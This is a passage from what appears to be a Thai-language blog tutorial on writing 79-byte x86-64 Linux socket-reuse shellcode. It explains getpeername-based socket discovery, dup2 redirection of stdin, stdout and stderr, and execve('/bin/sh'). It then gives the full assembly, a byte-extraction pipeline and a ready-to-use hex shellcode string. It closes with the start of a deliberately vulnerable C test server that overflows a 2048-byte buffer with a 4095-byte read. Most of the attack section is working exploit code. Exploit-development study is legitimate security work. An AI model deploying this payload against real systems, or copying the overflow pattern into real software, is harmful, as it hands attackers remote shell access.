‡πÜ ‡∏Ñ‡∏∑‡∏≠‡∏´‡∏≤‡∏Å‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á rax != 0 ‡πÄ‡∏£‡∏≤‡∏à‡∏∞ <code>jmp</code> ‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏ó‡∏µ‡πà loop_findfd ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤ sockfd ‡∏à‡∏ô‡∏Å‡∏ß‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏à‡∏≠</p>
<pre><code class="language-nasm">	test rax, rax       ; if rax != 0 jmp to loop_findfd
	                        ; else =&gt; rdi is sockfd -&gt; dup 
	jne loop_findfd
</code></pre>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏ñ‡πâ‡∏≤‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÑ‡∏î‡πâ‡∏Ñ‡πà‡∏≤ sockfd ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡∏≤‡∏°‡∏´‡∏≤ (rax = 0) ‡∏°‡∏±‡∏ô‡∏Å‡πá‡∏à‡∏∞‡πÑ‡∏°‡πà <code>jmp</code> ‡πÅ‡∏•‡πâ‡∏ß‡πÑ‡∏õ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏ó‡∏µ‡πà‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏Ñ‡πâ‡∏≤‡∏ö ‡πÇ‡∏î‡∏¢‡∏ó‡∏µ‡πà‡∏Ñ‡πà‡∏≤ sockfd ‡∏à‡∏∞‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà rdi ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏≠‡∏á‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<blockquote>
<p>‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡∏ï‡∏£‡∏á‡∏ô‡∏µ‡πâ‡πÄ‡∏£‡∏≤‡∏≠‡∏≤‡∏à‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡∏î‡πâ‡∏ß‡∏¢‡∏ß‡πà‡∏≤ FD ‡∏ô‡∏µ‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡∏≠‡∏á IP ‡πÄ‡∏£‡∏≤‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡∏£‡∏∂‡πÄ‡∏õ‡∏•‡πà‡∏≤‡πÅ‡∏ï‡πà‡∏ú‡∏°‡∏Ç‡∏µ‡πâ‡πÄ‡∏Å‡∏µ‡∏¢‡∏à‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏≠‡πà‡∏∞ ‡∏ñ‡πâ‡∏≤‡πÉ‡∏Ñ‡∏£‡∏≠‡∏¢‡∏≤‡∏Å‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á IP Address ‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á <code>rsi+4</code> ‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö‡∏ö</p>
</blockquote>
<p>‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡πÄ‡∏≠‡∏≤‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏°‡∏≤‡∏õ‡∏£‡∏∞‡∏Å‡∏≠‡∏ö‡∏£‡πà‡∏≤‡∏á Assembly ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö</p>
<pre><code class="language-nasm">find_fd:

    xor rdx, rdx        ; rdx = 0
    mov rdi, rdx        ; rdi = 0
    
    ; rsi = *addr
    push rdx            ; prep stack for *addr
    push rdx            ; prep stack for *addr
    mov rsi, rsp        ; rsi = *addr

    ; rdx = *addr_len
    mov dl, 16          ; addr_len = 16
    push rdx            ; push addr_len to stack
    mov rdx, rsp        ; rdi = *addr_len

    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every loop

    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername

    test rax, rax       ; if rax != 0 jmp to loop_findfd
                        ; else =&gt; rdi is sockfd -&gt; dup2 
    jne loop_findfd
</code></pre>
<h3 id="2-‡πÉ‡∏ä‡∏ü‡∏á‡∏Å‡∏ä‡∏ô-dup2-‡πÄ‡∏û‡∏≠‡∏ó‡∏≥‡πÉ‡∏´-fd-0-1-‡πÅ‡∏•‡∏∞-2-‡πÄ‡∏ä‡∏≠‡∏°‡∏Å‡∏ö-sockfd-‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤">2. ‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô dup2 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡πÉ‡∏´‡πâ fd 0, 1, ‡πÅ‡∏•‡∏∞ 2 ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏Å‡∏±‡∏ö sockfd ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤</h3>
<p>‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡πÑ‡∏î‡πâ‡∏Ñ‡πà‡∏≤ sockfd ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ (‡∏ã‡∏∂‡πà‡∏á‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà rdi) ‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏Ñ‡∏∑‡∏≠‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô system call <code>dup2</code> ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏±‡∏î‡∏•‡∏≠‡∏Å sockfd ‡∏Ç‡∏≠‡∏á socket ‡πÄ‡∏£‡∏≤‡πÑ‡∏õ‡∏ó‡∏±‡∏ö STDIN, STDOUT ‡πÅ‡∏•‡∏∞ STDERR ‡∏à‡∏∞‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏ï‡∏¥‡∏î‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö shell ‡πÑ‡∏î‡πâ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏≠‡∏á</p>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏à‡∏≤‡∏Å <a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man-page</a> page dup2 ‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ argument ‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ</p>
<pre><code class="language-c">int dup2(int oldfd, int newfd);
</code></pre>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏ñ‡πâ‡∏≤‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡∏ú‡πà‡∏≤‡∏ô syscall ‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ register ‡πÉ‡∏´‡πâ‡∏°‡∏µ‡∏Ñ‡πà‡∏≤‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ</p>
<ul>
<li><strong>RAX</strong> =¬†0x21</li>
<li><strong>RDI</strong> =¬†sockfd</li>
<li><strong>RSI</strong>¬†=¬†0,1,2</li>
</ul>
<p>‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡∏£‡∏π‡πâ‡πÅ‡∏•‡πâ‡∏ß‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πà‡∏á‡∏Ñ‡πà‡∏≤ register ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏£‡∏µ‡∏¢‡∏Å syscall ‡∏¢‡∏±‡∏á‡πÑ‡∏á‡∏ö‡πâ‡∏≤‡∏á ‡πÄ‡∏£‡∏≤‡∏°‡∏≤‡∏ß‡∏≤‡∏á‡πÅ‡∏ú‡∏ô‡∏Å‡∏±‡∏ô‡∏î‡∏µ‡∏Å‡∏ß‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡∏ñ‡πâ‡∏≤‡∏´‡∏≤‡∏Å‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÄ‡∏õ‡πá‡∏ô C ‡∏à‡∏∞‡πÑ‡∏î‡πâ‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ</p>
<pre><code class="language-c">dup2(sockfd, 0);    //rdi = sockfd, rsi = 0
dup2(sockfd, 1);    //rdi = sockfd, rsi = 1
dup2(sockfd, 2);    //rdi = sockfd, rsi = 2
</code></pre>
<p>‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏£‡∏µ‡∏¢‡∏Å dup2 ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î 3 ‡∏£‡∏≠‡∏ö‡πÇ‡∏î‡∏¢‡∏Ñ‡πà‡∏≤ rdi ‡∏Ñ‡∏á‡πÄ‡∏î‡∏¥‡∏°‡πÅ‡∏•‡∏∞‡∏Ñ‡πà‡∏≤ rsi ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡∏∂‡πâ‡∏ô‡∏ó‡∏µ‡∏•‡∏∞ 1 ‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏Å‡πà‡∏≠‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á rdi ‡πÄ‡∏õ‡πá‡∏ô sockfd ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß‡∏ô‡∏±‡πà‡∏ô‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÑ‡∏õ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏≠‡∏∞‡πÑ‡∏£‡πÄ‡∏•‡∏¢</p>
<p>‡πÄ‡∏£‡∏≤‡∏à‡∏∂‡∏á‡∏°‡∏≤‡∏î‡∏π‡∏ó‡∏µ‡πà‡∏Ñ‡πà‡∏≤ rsi ‡∏Å‡∏±‡∏ô‡∏ï‡πà‡∏≠ ‡∏à‡∏∞‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏î‡πâ‡∏ß‡∏¢‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ rsi ‡πÄ‡∏õ‡πá‡∏ô 0 ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏•‡∏¢</p>
<pre><code class="language-nasm">  xor rsi, rsi        ; rsi = 0
</code></pre>
<p>‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ label loop_dup2 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ loop ‡πÅ‡∏•‡∏∞‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ rax ‡πÄ‡∏õ‡πá‡∏ô 0x21 ‡∏ã‡∏∂‡πà‡∏á‡πÄ‡∏õ‡πá‡∏ô syscall ‡∏Ç‡∏≠‡∏á dup2</p>
<pre><code class="language-nasm">  loop_dup2:
  mov rax, rsi
  mov al, 0x21        ; rax = 0x21
  syscall             ; call dup2(sockfd, rsi)
</code></pre>
<p>‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ó‡∏≥ syscall ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡πÄ‡∏£‡∏≤‡∏Å‡πá‡∏à‡∏∞‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡πà‡∏≤ rsi ‡∏Ç‡∏∂‡πâ‡∏ô 1 ‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ <code>cmp sil, 0x3</code> ‡∏ß‡πà‡∏≤ sil (byte ‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á rsi) ‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏ó‡πà‡∏≤‡∏Å‡∏±‡∏ö 3 ‡∏´‡∏£‡∏∑‡∏≠‡∏¢‡∏±‡∏á‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡∏Å‡πá <code>jmp</code> ‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏ó‡∏µ‡πà <code>loop_dup2</code> ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ dup2 ‡πÉ‡∏´‡πâ‡∏Ñ‡∏£‡∏ö‡∏ó‡∏±‡πâ‡∏á 0, 1, ‡πÅ‡∏•‡∏∞ 2</p>
<pre><code class="language-nasm">  inc rsi
  cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                      ; else execv spawn shell
  jne loop_dup2
</code></pre>
<p>‡∏ñ‡πâ‡∏≤‡∏´‡∏≤‡∏Å‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ dup2 ‡∏Ñ‡∏£‡∏ö‡πÅ‡∏•‡πâ‡∏ß‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á rsi ‡∏Ñ‡∏ß‡∏£‡∏à‡∏∞‡∏°‡∏µ‡∏Ñ‡πà‡∏≤ ‡πÄ‡∏õ‡πá‡∏ô 3 ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ <code>cmp</code> ‡∏Å‡πá‡∏à‡∏∞‡πÑ‡∏°‡πà‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ <code>jmp</code> ‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏ó‡∏µ‡πà <code>loop_dup2</code> ‡∏≠‡∏µ‡∏Å‡∏ï‡πà‡∏≠‡πÑ‡∏õ</p>
<p>‡∏ã‡∏∂‡πà‡∏á‡∏ï‡∏≠‡∏ô‡∏ô‡∏µ‡πâ‡πÄ‡∏≠‡∏á‡πÄ‡∏ô‡∏µ‡πà‡∏¢‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏° sockfd ‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤‡πÄ‡∏Ç‡πâ‡∏≤‡∏Å‡∏±‡∏ö STDIN, STDOUT, ‡πÅ‡∏•‡∏∞ STDERR ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢ ‡πÄ‡∏≠‡∏≤‡∏°‡∏≤‡∏£‡∏ß‡∏°‡∏Å‡∏±‡∏ô‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÑ‡∏î‡πâ assembly ‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö‡∏ö</p>
<pre><code class="language-nasm">dup2:
    xor rsi, rsi        ; rsi = 0

    loop_dup2:
    mov rax, rsi
    mov al, 0x21        ; rax = 0x21
    syscall             ; call dup2(sockfd, rsi)

    inc rsi
    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                        ; else execv spawn shell
    jne loop_dup2
</code></pre>
<h3 id="3-‡πÄ‡∏£‡∏¢‡∏Å-shell">3. ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å Shell</h3>
<p>‡∏ú‡∏°‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å <code>/bin/sh</code> ‡πÑ‡∏°‡πà‡πÄ‡∏õ‡πá‡∏ô‡∏î‡πâ‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô Script kiddie ‡∏Ç‡∏≠‡∏¢‡∏≤‡∏î‡∏Å‡πá‡∏≠‡∏õ Assembly ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏≠‡∏≤‡∏°‡∏≤‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô shellcode ‡∏°‡∏≤‡∏à‡∏≤‡∏Å <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Shellstorm</a> ‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö‡∏ö‡∏ö</p>
<p>‡πÉ‡∏ô‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ú‡∏°‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÄ‡∏≠‡∏á ‡∏ú‡∏°‡∏Å‡πá‡πÑ‡∏°‡πà‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏ß‡πà‡∏≤‡∏°‡∏±‡∏ô‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏¢‡∏±‡∏á‡πÑ‡∏á ‡πÄ‡∏•‡∏¢‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÉ‡∏´‡πâ‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏ô‡∏ü‡∏±‡∏á‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<p>‡∏¢‡∏±‡∏á‡πÑ‡∏á‡∏£‡∏ö‡∏Å‡∏ß‡∏ô‡∏ó‡∏∏‡∏Å‡∏Ñ‡∏ô‡∏•‡∏≠‡∏á‡πÅ‡∏Å‡∏∞‡∏î‡∏π‡∏´‡∏ô‡πà‡∏≠‡∏¢‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö‡∏ß‡πà‡∏≤ assembly ‡∏ä‡∏∏‡∏î‡∏ô‡∏µ‡πâ‡∏°‡∏±‡∏ô‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏≠‡∏∞‡πÑ‡∏£ ‡πÅ‡∏•‡πâ‡∏ß‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ ‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ neg ‡πÉ‡∏ä‡πâ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏≠‡∏∑‡πà‡∏ô‡πÑ‡∏î‡πâ‡∏°‡∏±‡πâ‡∏¢ ‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà shellcode ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô stack ‡∏°‡∏±‡∏ô‡∏à‡∏∞‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡πÑ‡∏´‡∏ô ‡πÅ‡∏Ñ‡πà‡∏Ñ‡∏¥‡∏î‡∏Å‡πá‡∏ô‡πà‡∏≤‡∏™‡∏ô‡∏∏‡∏Å‡πÅ‡∏•‡πâ‡∏ß‡πÉ‡∏ä‡πà‡∏°‡∏±‡πâ‡∏¢‡∏Ñ‡πâ‡∏≤‡∏ö ‡∏•‡∏≠‡∏á‡πÄ‡∏≠‡∏≤‡πÑ‡∏õ‡∏ó‡∏≥‡∏î‡∏π‡∏Å‡∏±‡∏ô‡∏ô‡∏∞‡∏Ñ‡πâ‡∏≤‡∏ö ‡πÅ‡∏•‡πâ‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏•‡∏∑‡∏°‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡∏™‡∏≠‡∏ô‡∏ú‡∏°‡∏î‡πâ‡∏ß‡∏¢ üòÇ</p>
<p>‡∏´‡∏£‡∏∑‡∏≠‡∏ñ‡πâ‡∏≤‡πÉ‡∏Ñ‡∏£‡∏á‡∏á‡∏à‡∏£‡∏¥‡∏á ‡πÜ ‡∏ó‡∏±‡∏Å‡πÑ‡∏õ‡∏ñ‡∏≤‡∏° <a href="https://web.facebook.com/bank.eakasit">@Bank</a> ‡πÑ‡∏î‡πâ‡πÄ‡∏•‡∏¢‡∏ô‡∏∞‡∏Ñ‡∏£‡∏±‡∏ö ‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏Å‡∏£‡∏á‡πÉ‡∏à</p>
<pre><code class="language-nasm">exec_shell:
	xor rax, rax
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	push rsp
	pop rdi
	cdq
	push rdx
	push rdi
	push rsp
	pop rsi
	mov al, 0x3b
	syscall
</code></pre>
<p>‡∏à‡∏ö‡πÅ‡∏•‡πâ‡∏ß‡∏Ñ‡∏£‡∏±‡∏û ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏≠‡∏≤‡∏°‡∏≤‡∏õ‡∏£‡∏∞‡∏Å‡∏≠‡∏ö‡∏£‡πà‡∏≤‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡πá‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ</p>
<pre><code class="language-nasm">; Linux x86-64 - Execve (&quot;/bin/sh&quot;) Socket Reuse
; Length: 79 bytes
; Date: 21/03/2021
; Author: Puttimate &quot;Jusmistic&quot; Thammasaeng
; Tested on: x86_64 Debian GNU/Linux

; Socket Reuse x86-64
; 1. Finding sockfd using getpeername function.
; 2. Call dup2 sockfd with 0,1 and 2.
; 3. Execute /bin/sh.

; nasm -f elf64 socket_reuse.asm -o socket_reuse
; objdump -d ./socket_reuse |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
; Ref: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/

find_fd:
    ; 1. Finding sockfd using getpeername function.
    ; int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ;   src: https://man7.org/linux/man-pages/man2/getpeername.2.html
    ; getpeername syscall: 0x34 
    ;   rax = 0x34 
    ;   rdi = sockfd
    ;   rsi = *addr
    ;   rdx = *addr_len
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ;   Note:
    ;       sockaddr size is 16 bytes.
    ;   Solution:
    ;       1. Prepare stack for *addr and *addr_len
    ;       2. Call getpeername(sockfd++, ...)
    ;       3. loop until rax eq 0 (if the sockfd is correct rax will eq 0)
    ;       After we found a sockfd IP Address will store at rsi+4.
    ;       You can add an IP checking if you want.

    xor rdx, rdx        ; rdx = 0
    mov rdi, rdx        ; rdi = 0
    
    ; rsi = *addr
    push rdx            ; prep stack for *addr
    push rdx            ; prep stack for *addr
    mov rsi, rsp        ; rsi = *addr

    ; rdx = *addr_len
    mov dl, 16          ; addr_len = 16
    push rdx            ; push addr_len to stack
    mov rdx, rsp        ; rdi = *addr_len

    ; syscall getpeername
    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every loop

    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername

    test rax, rax       ; if rax != 0 jmp to loop_findfd
                        ; else =&gt; rdi is sockfd -&gt; dup2 
    jne loop_findfd


dup2:
    ; 2. Call dup2 sockfd with 0,1 and 2.
    ; int dup2(int oldfd, int newfd);
    ;   src: https://man7.org/linux/man-pages/man2/dup2.2.html
    ; dup2 syscall number: 0x21
    ;   rax = 0x21
    ;   rdi = sockfd
    ;   rsi = 0,1,2
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ; Solution:
    ;   1. Setup arg for dup2 function.
    ;   2. Call dup2 function.

    xor rsi, rsi        ; rsi = 0

    loop_dup2:
    mov rax, rsi
    mov al, 0x21        ; rax = 0x21
    syscall             ; call dup2(sockfd, rsi)

    inc rsi
    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                        ; else execv spawn shell
    jne loop_dup2



exec_shell:
    ; 3. Execute /bin/sh.
    ; I don't know how to write shellcode to spawn shell just use the snippet from http://shell-storm.org/shellcode/files/shellcode-806.php .

    xor rax, rax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

;
; Python3
;   sc = b&quot;\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
;   Length: 79 bytes
;

</code></pre>
<h2 id="‡∏°‡∏≤‡∏ó‡∏î‡∏™‡∏≠‡∏ö-shellcode-‡∏Å‡∏ô‡∏î‡∏Å‡∏ß‡∏≤‡∏Ñ‡∏≤‡∏ö">‡∏°‡∏≤‡∏ó‡∏î‡∏™‡∏≠‡∏ö Shellcode ‡∏Å‡∏±‡∏ô‡∏î‡∏µ‡∏Å‡∏ß‡πà‡∏≤‡∏Ñ‡πâ‡∏≤‡∏ö</h2>
<p>‡∏Ç‡∏±‡πâ‡∏ô‡πÅ‡∏£‡∏Å‡πÄ‡∏•‡∏¢‡∏ú‡∏°‡πÉ‡∏ä‡πâ‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏à‡∏≤‡∏Å <a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">DHAYALAN</a>  ‡∏°‡∏≤‡πÇ‡∏°‡∏≠‡πà‡∏∞ ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏Ç‡∏µ‡πâ‡πÄ‡∏Å‡∏µ‡∏¢‡∏à‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÄ‡∏≠‡∏á‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ‡∏Ñ‡πâ‡∏≤‡∏ö</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt; 
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;

// src: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
// use for testing Socket-reuse shellcode x64

int newsockfd;

void error(const char *msg)
{
    perror(msg);
    exit(1);
}
void greet(int newsockfd){
  int n;
  char Hello[500];
  char buffer[2048];

  sprintf(Hello, &quot;Welcome to my server!Send a message!\nbuffer: %lp\n&quot;, &amp;buffer);

  write(newsockfd,Hello,strlen(Hello));

  n = read(newsockfd,buffer,4095);
  if (n &lt; 0) error(&quot;ERROR reading from socket&quot;);

}
int main(int argc, char *argv[])
{
     int sockfd, portno;
     socklen_t clilen;
     char buffer[4096], reply[5100];
